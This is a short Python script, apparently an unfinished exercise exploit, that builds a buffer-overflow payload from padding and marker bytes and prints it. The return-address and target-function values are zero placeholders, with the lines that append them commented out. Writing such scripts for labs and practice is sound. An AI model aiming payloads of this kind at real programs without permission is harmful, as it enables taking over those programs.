#!/usr/bin/env python3

import sys


oflow = b'A' * 150 + b'B' +  b'C' * 8 + b'D' * 8 + b'E' * 8

retaddr = 0 # GDB

faddr = 0 # spare_func1

exploit = bytearray(oflow)
#exploit.extend(retaddr.to_bytes(8, byteorder='little'))
#exploit.extend(faddr.to_bytes(8, byteorder='little'))
exploit.extend(b'\n')
sys.stdout.buffer.write(exploit)


